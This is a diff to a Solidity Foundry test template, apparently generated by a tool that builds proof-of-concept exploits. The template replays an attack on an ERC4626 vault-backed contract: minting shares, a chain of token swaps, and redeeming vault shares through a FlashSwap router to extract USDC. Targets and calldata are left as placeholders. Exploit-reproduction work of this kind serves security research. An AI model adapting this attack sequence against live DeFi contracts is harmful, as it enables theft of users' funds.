@@ -18,8 +18,9 @@ pragma solidity ^0.8.15;
 //   {{ATTACKER_MINT_AMOUNT}}     - mint shares 数量
 //   {{SWAP_USDC_TO_ASSET_TARGET}}    - Step1 swap 目标合约
 //   {{SWAP_USDC_TO_ASSET_CALLDATA}}  - Step1 swap calldata
-//   {{SWAP_ASSET_TO_USDC_TARGET}}    - Step4 swap 目标合约
-//   {{SWAP_ASSET_TO_USDC_CALLDATA}}  - Step4 swap calldata
+//   {{SWAP_VAULT_TO_ASSET_TARGET}}   - Step4a vault→asset 路由目标（FlashSwap ERC4626）
+//   {{SWAP_ASSET_TO_USDC_TARGET}}    - Step4b asset→USDC swap 目标合约
+//   {{SWAP_ASSET_TO_USDC_CALLDATA}}  - Step4b asset→USDC swap calldata
 //   {{SWAP_REUSD_TO_ASSET_TARGET}}   - Step3 reUSD→asset swap 目标合约
 //   {{SWAP_REUSD_TO_ASSET_CALLDATA}} - Step3 reUSD→asset swap calldata
 // ===========================================================================
@@ -95,7 +96,9 @@ contract {{CONTRACT_NAME}} is BaseTestWithBalanceLog {
 
         // 从攻击合约动态查询 Vault 和资产地址
         erc4626vault = IERC4626Gen(suspiciousVulnerableContract.collateral());
-        assetController = erc4626vault.controller();
+        // controller() 并非所有 ERC4626 vault 都有，fallback 到 vault 地址自身
+        (bool ok, bytes memory ret) = address(erc4626vault).staticcall(abi.encodeWithSignature("controller()"));
+        assetController = (ok && ret.length == 32) ? abi.decode(ret, (address)) : address(erc4626vault);
         vaultAsset = IERC20Gen(erc4626vault.asset());
     }
 
@@ -145,20 +148,27 @@ contract {{CONTRACT_NAME}} is BaseTestWithBalanceLog {
         require(ok2, "reUSD->Asset swap failed");
     }
 
-    /// @dev Step 4: 赎回 vault shares，将全部 asset 换回 USDC
+    /// @dev Step 4: vault shares + 剩余 asset → USDC（全程接入 FlashSwap 路由）
     function _redeemAndFinalSwap() internal {
-        // 如果持有 vault 的额外 shares，赎回它们
+        // 4a: vault shares → asset（通过 FlashSwap ERC4626 路由赎回）
         uint256 vaultBalance = erc4626vault.balanceOf(address(this));
         if (vaultBalance > 0) {
-            erc4626vault.redeem(vaultBalance, address(this), address(this));
+            address redeemTarget = {{SWAP_VAULT_TO_ASSET_TARGET}};
+            erc4626vault.approve(redeemTarget, vaultBalance);
+            (bool okRedeem,) = redeemTarget.call(
+                abi.encodeWithSelector(erc4626vault.redeem.selector, vaultBalance, address(this), address(this))
+            );
+            require(okRedeem, "VaultShares->Asset redeem failed");
         }
-        // asset → USDC
+        // 4b: 所有 asset → USDC（通过 FlashSwap inputData API calldata）
         uint256 assetBalance = vaultAsset.balanceOf(address(this));
-        address target = {{SWAP_ASSET_TO_USDC_TARGET}};
-        vaultAsset.approve(target, assetBalance);
-        string memory inputData = "{{SWAP_ASSET_TO_USDC_CALLDATA}}";
-        bytes memory data = vm.parseBytes(inputData);
-        (bool ok,) = target.call(data);
-        require(ok, "Asset->USDC swap failed");
+        if (assetBalance > 0) {
+            address target = {{SWAP_ASSET_TO_USDC_TARGET}};
+            vaultAsset.approve(target, assetBalance);
+            string memory inputData = "{{SWAP_ASSET_TO_USDC_CALLDATA}}";
+            bytes memory data = vm.parseBytes(inputData);
+            (bool ok,) = target.call(data);
+            require(ok, "Asset->USDC swap failed");
+        }
     }
 }
